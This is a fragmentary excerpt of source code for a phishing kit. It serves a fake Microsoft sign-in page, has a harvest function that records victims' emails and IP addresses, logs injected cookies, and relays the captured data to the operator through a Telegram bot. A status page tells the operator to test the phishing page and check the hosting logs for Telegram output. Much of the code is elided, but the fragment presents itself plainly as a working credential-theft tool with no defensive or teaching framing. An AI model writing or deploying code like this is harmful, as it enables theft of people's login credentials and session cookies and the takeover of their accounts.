...
def send_telegram(msg):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            print(f"📱 SENDING TELEGRAM: Token={TELEGRAM_TOKEN[:10]}..., Chat={TELEGRAM_CHAT_ID}")
...
<body>
<div class="login">
<img class="logo" src="data:image/svg+xml;base64," alt="Microsoft">
<h1>Sign in</h1>
...
def harvest():
    try:
        ...
        print(f"🎣 HARVESTING: {email} | IP: {ip}")
...
console.log("Cookies injected:", "{cookies[:50] if cookies else ''}...");
...
<p>Telegram Token: {'✅ SET' if TELEGRAM_TOKEN else '❌ MISSING'}</p>
<p>Telegram Chat ID: {'✅ SET' if TELEGRAM_CHAT_ID else '❌ MISSING'}</p>
...
<p>Telegram Token: {TELEGRAM_TOKEN[:10] if TELEGRAM_TOKEN else 'NOT SET'}...</p>
<p>Telegram Chat ID: {TELEGRAM_CHAT_ID if TELEGRAM_CHAT_ID else 'NOT SET'}</p>
<p>Token Length: {len(TELEGRAM_TOKEN) if TELEGRAM_TOKEN else 0}</p>
<p>Test the phishing page and check Railway logs for Telegram output.</p>
"""
